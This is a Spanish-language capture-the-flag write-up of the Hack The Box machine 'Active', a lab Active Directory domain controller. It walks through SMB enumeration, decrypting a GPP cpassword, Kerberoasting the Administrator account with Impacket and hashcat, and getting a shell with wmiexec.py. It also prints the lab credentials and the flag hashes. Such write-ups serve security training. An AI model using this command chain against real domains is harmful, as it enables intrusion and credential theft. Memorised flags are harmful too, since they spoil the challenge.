---
tags:
  - asset/active-directory
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/148
dificultad: Fácil
ip: 10.10.10.100
os: Windows
linked:
  - "[[Abusing GPP Passwords]]"
  - "[[Decrypting GPP Passwords - gpp-decrypt]]"
  - "[[Kerberoasting Attack (GetUserSPNs.py)]]"
---
# HackTheBox - Active

## Reconocimiento

Inicié mi análisis con un escaneo de puertos exhaustivo utilizando `masscan` y `nmap` para identificar los servicios activos en la máquina `10.10.10.100`.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 01_Reconnaissance/tcpports
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49171,49173 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

El resultado de `nmap` reveló una gran cantidad de puertos abiertos, lo cual indicaba que se trataba de un Controlador de Dominio de Active Directory.
```Fragmento de código
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-27 10:08 GMT
Nmap scan report for 10.10.10.100
Host is up (0.039s latency).

PORT      STATE SERVICE            VERSION
53/tcp    open  domain             Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2023-11-27 10:08:23Z)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
...
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3s
| smb2-security-mode:
|   210:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-11-27T10:09:21
|_  start_date: 2023-11-27T09:56:42
```

Los puertos clave como el **53 (DNS)**, **88 (Kerberos)**, **389 (LDAP)** y **445 (SMB)** confirmaron la presencia de un entorno de Active Directory con el dominio `active.htb`. Procedí a añadir este dominio a mi archivo `/etc/hosts` para facilitar la resolución de nombres.
```Bash
echo "10.10.10.100 active.htb" | sudo tee -a /etc/hosts
```

### Enumeración SMB

Con el puerto 445 abierto, mi siguiente paso fue enumerar los recursos compartidos SMB. Utilicé `smbclient` con un inicio de sesión anónimo, lo cual fue exitoso.
```Bash
smbclient -L //10.10.10.100
```

```Fragmento de código
Anonymous login successful
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	Replication     Disk      
	SYSVOL          Disk      Logon server share
	Users           Disk      
```

Para verificar rápidamente los permisos de acceso a estos recursos, utilicé `smbmap`.
```Bash
smbmap -H 10.10.10.100
```

```Fragmento de código
[+] IP: 10.10.10.100:445  Name: active.htb        Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                                	NO ACCESS	Remote Admin
	C$                                                    	NO ACCESS	Default share
	IPC$                                                  	NO ACCESS	Remote IPC
	NETLOGON                                              	NO ACCESS	Logon server share
	Replication                                           	READ ONLY	
	SYSVOL                                                	NO ACCESS	Logon server share
	Users                                                 	NO ACCESS	
```

> [!IMPORTANT] Hallazgo Clave
> 
> Descubrí que el recurso compartido Replication tenía permisos de lectura anónima. Este recurso a menudo contiene una réplica de SYSVOL, que almacena políticas de grupo (GPO), scripts de inicio de sesión y, lo más importante, las Group Policy Preferences (GPP).

Decidí descargar recursivamente todo el contenido del recurso `Replication` para analizarlo en busca de información sensible.
```Bash
smbclient //10.10.10.100/Replication
Password for [WORKGROUP\user]:
Anonymous login successful
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
```

Durante la descarga, encontré un archivo particularmente interesante: `Groups.xml`.

---

## Explotación de vulnerabilidades

### Group Policy Preferences (GPP)

El archivo `Groups.xml` es conocido por almacenar configuraciones de políticas de grupo, incluyendo la creación o modificación de usuarios locales. En versiones antiguas de Windows Server, las contraseñas se guardaban en este archivo cifradas con una clave AES-256 que Microsoft publicó accidentalmente.

Al inspeccionar el contenido del archivo, encontré credenciales para un usuario de servicio.
```XML
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
    <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
        <Properties action="U" 
        newName="" 
        fullName="" 
        description="" 
        cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
        changeLogon="0" 
        noChange="1" 
        neverExpires="1" 
        acctDisabled="0" 
        userName="active.htb\SVC_TGS"/>
    </User>
</Groups>
```

> [!note] Vulnerabilidad GPP
> 
> La contraseña almacenada en el atributo cpassword está cifrada con AES-256, pero la clave de cifrado es pública. Esto permite que cualquiera que pueda leer este archivo pueda descifrar la contraseña fácilmente.

Extraje el valor de `cpassword` y utilicé la herramienta `gpp-decrypt` para obtener la contraseña en texto plano.
```Bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

```Fragmento de código
GPPstillStandingStrong2k18
```

Con esto, obtuve las credenciales del usuario `active.htb\SVC_TGS`:`GPPstillStandingStrong2k18`.

### Acceso Inicial y Obtención de la Bandera de Usuario

Ahora con credenciales válidas, volví a enumerar los recursos compartidos, esta vez de forma autenticada.
```Bash
smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100
```

```Fragmento de código
[+] IP: 10.10.10.100:445  Name: 10.10.10.100
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                                	NO ACCESS
	C$                                                    	NO ACCESS
	IPC$                                                  	NO ACCESS
	NETLOGON                                              	READ ONLY
	Replication                                           	READ ONLY
	SYSVOL                                                	READ ONLY
	Users                                                 	READ ONLY
```

El acceso al recurso `Users` me permitió navegar hasta el escritorio del usuario `SVC_TGS` y leer la bandera de usuario.
```Bash
smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.10.10.100/Users
smb: \> cd SVC_TGS\Desktop\
smb: \SVC_TGS\Desktop\> get user.txt
```

---

## Escalada de privilegios

### Enumeración Autenticada

Con acceso al dominio, mi objetivo era encontrar una vía para escalar privilegios. Utilicé `ldapsearch` para consultar el Controlador de Dominio y listar todos los usuarios activos.

> [!info] Desglose del Filtro LDAP
> 
> El filtro (&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))) busca objetos que sean personas y usuarios, y excluye aquellos que tienen el bit de "cuenta deshabilitada" (2) activado en el atributo userAccountControl.

```Bash
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" \
"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
```

```Fragmento de código
sAMAccountName: Administrator
sAMAccountName: SVC_TGS
```
La consulta confirmó que la cuenta de `Administrator` estaba activa.

o

```bash
rpcclient -U 'SVC_TGS%GPPstillStandingStrong2k18' 10.10.10.100
enumdomusers
```
```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]
```

### Kerberoasting

El siguiente paso fue buscar cuentas de usuario que tuvieran configurado un **Service Principal Name (SPN)**. Un SPN asocia un servicio con una cuenta de inicio de sesión. Si una cuenta de usuario (en lugar de una cuenta de máquina) tiene un SPN, es vulnerable a un ataque de **Kerberoasting**.

> [!warning] ¿Qué es Kerberoasting?
> 
> Este ataque permite a cualquier usuario autenticado solicitar un Ticket Granting Service (TGS) para un servicio asociado a un SPN. Parte de este ticket está cifrado con el hash NTLM de la cuenta de servicio. Al capturar este ticket, puedo intentar crackear el hash offline para obtener la contraseña en texto plano.

Modifiqué mi consulta LDAP para buscar usuarios con un SPN configurado (`serviceprincipalname=*/*`).
```Bash
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" \
"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname
```

```Fragmento de código
dn: CN=Administrator,CN=Users,DC=active,DC=htb
servicePrincipalName: active/CIFS:445
```

La cuenta `Administrator` tenía un SPN, lo que la convertía en un objetivo perfecto. Utilicé el script `GetUserSPNs.py` de Impacket para solicitar el TGS y extraer el hash.
```Bash
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request
```

```Fragmento de código
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$73fd1c...<SNIP>...
```

### Cracking del Hash Kerberos

Con el hash TGS en mi poder, utilicé `hashcat` para crackearlo. El modo `-m 13100` es específico para este tipo de hashes (Kerberos 5, TGS-REP).
```Bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force
```

Al cabo de un rato, `hashcat` encontró la contraseña.
```Fragmento de código
$krb5tgs$23$*Administrator$ACTIVE.HTB$<...SNIP...>:Ticketmaster1968
```

La contraseña para el usuario `active\administrator` era `Ticketmaster1968`.

### Shell como Administrador

Finalmente, con las credenciales de administrador del dominio, utilicé `wmiexec.py` de Impacket para obtener una shell interactiva en el sistema.
```Bash
wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
```

```Fragmento de código
Impacket v0.10.1.dev1 - Copyright 2022 Fortra
[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
active\administrator
```

Con privilegios de administrador, navegué hasta `C:\Users\Administrator\Desktop` y obtuve la bandera `root.txt`.


---

## Bandera(s)

> [!flag] `flag{user}`
> be726c482499c4c1515edbc6983ecd0d
^bandera-user

> [!flag] `flag{root}`
> ec8b57bdfcd09bf0759450fa2e0a2e29
^bandera-root
